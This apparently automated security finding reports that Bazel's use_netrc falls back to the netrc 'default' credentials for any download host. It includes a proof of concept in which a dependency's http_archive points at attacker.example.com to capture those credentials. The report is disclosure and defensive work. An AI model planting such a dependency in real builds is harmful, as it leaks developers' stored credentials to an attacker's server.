## Title
Netrc "default" credentials are attached to any attacker-chosen download URL, leaking secrets to untrusted hosts - (File: tools/build_defs/repo/utils.bzl)

### Summary
Bazel's `http_archive`/`http_file` repo rules compute HTTP authentication for download URLs by calling `get_auth(ctx, source_urls)`, which in turn calls `use_netrc()` [1](#0-0) . `use_netrc` looks up the URL's host in the parsed `.netrc` file, but if the host is not explicitly listed it silently falls back to the netrc `default` machine entry and attaches its login/password to the request [2](#0-1) .

### Finding Description
`get_auth` reads the user's netrc file — either from `ctx.attr.netrc`, the `NETRC` environment variable, or the user's default `~/.netrc` via `read_user_netrc` [3](#0-2)  — then calls `use_netrc(netrc, urls, auth_patterns)` with the exact URLs to be fetched. Inside `use_netrc`, the host is extracted from each URL and matched against the netrc dict; if there's no exact match but a `default` entry exists (`netrc[""]`), that entry's credentials are used for the URL anyway: [4](#0-3) 

The `source_urls` passed into `get_auth` come straight from the `url`/`urls` attribute of the `http_archive`/`http_file` rule invocation [5](#0-4) , which is attacker-controllable content when the rule is invoked from a third-party module extension, a transitive Bazel module fetched from a registry, or a ruleset loaded from an untrusted branch/CI checkout — none of which are the victim's trusted root-repo Starlark. If the victim's local `.netrc` happens to contain a `default` machine entry (a legitimate, common netrc pattern for a catch-all credential, e.g., for an internal mirror or anonymous FTP), any URL the attacker specifies — including a host they fully control — will receive that credential via `Authorization`/basic-auth headers once fetched by `ctx.download`/`ctx.download_and_extract`.

### Impact Explanation
This breaks the invariant that credentials should be host-scoped: an unprivileged attacker who merely gets one URL fetched by the victim's build (through a dependency's `http_archive` call, a WORKSPACE macro, or a module extension) can direct Bazel to attach the victim's default netrc credentials to a request sent to a server the attacker controls, exfiltrating the login/password.

### Likelihood Explanation
Requires that the victim's `.netrc` contain a `default` entry with a password — a real but not universal configuration (commonly used for shared internal mirrors). No other privilege besides publishing a dependency/URL that the victim's build fetches is needed; no MITM, no root-repo Starlark trust is required.

### Recommendation
Do not silently fall back to the netrc `default` entry for arbitrary attacker-supplied hosts in `use_netrc`; require an explicit per-host match (or an explicit opt-in) before attaching credentials, and/or warn/require confirmation when the `default` entry is used for a URL/host that was not part of the rule caller's declared, trusted set.

### Proof of Concept
1. Populate `~/.netrc` with a `default` entry, e.g.:
```
default
  login victim-user
  password s3cr3t
```
2. A dependency (module extension or WORKSPACE macro) invokes:
```python
http_archive(
    name = "evil",
    urls = ["https://attacker.example.com/payload.tar.gz"],
    sha256 = "<any valid hash the attacker controls for their own payload>",
)
```
3. `get_auth(ctx, ["https://attacker.example.com/payload.tar.gz"])` → `use_netrc` finds no entry for `attacker.example.com`, falls back to `netrc[""]`, and returns `{"https://attacker.example.com/payload.tar.gz": {"type": "basic", "login": "victim-user", "password": "s3cr3t"}}` [6](#0-5) .
4. `ctx.download_and_extract` sends this Basic-Auth header to `attacker.example.com`, leaking the credential. This can be reproduced as a Starlark unit test analogous to the existing netrc parsing test in `src/test/shell/bazel/starlark_repository_test.sh` [7](#0-6) , asserting that `use_netrc()` returns credentials for a host absent from the netrc file when a `default` entry is present.

```text
def _get_source_urls(ctx):
    """Returns source urls provided via the url, urls attributes.

    Also checks that at least one url is provided."""
    if not ctx.attr.url and not ctx.attr.urls:
        fail("At least one of url and urls must be provided")

    source_urls = []
    if ctx.attr.urls:
        source_urls = ctx.attr.urls
    if ctx.attr.url:
        source_urls = [ctx.attr.url] + source_urls
    return source_urls
```

```text
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue

        if host in patterns:
            auth_dict = {
                "type": "pattern",
                "pattern": patterns[host],
            }

            if "login" in authforhost:
                auth_dict["login"] = authforhost["login"]

            if "password" in authforhost:
                auth_dict["password"] = authforhost["password"]

            auth[url] = auth_dict
        elif "password" in authforhost:
            if "login" in authforhost:
                auth[url] = {
                    "type": "basic",
                    "login": authforhost["login"],
                    "password": authforhost["password"],
                }
            else:
                auth[url] = {
                    "type": "pattern",
                    "pattern": "Bearer <password>",
                    "password": authforhost["password"],
                }
        else:
            # buildifier: disable=print
            print("WARNING: Found machine in .netrc for URL %s, but no password." % url)

    return auth
```

```text
def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
```
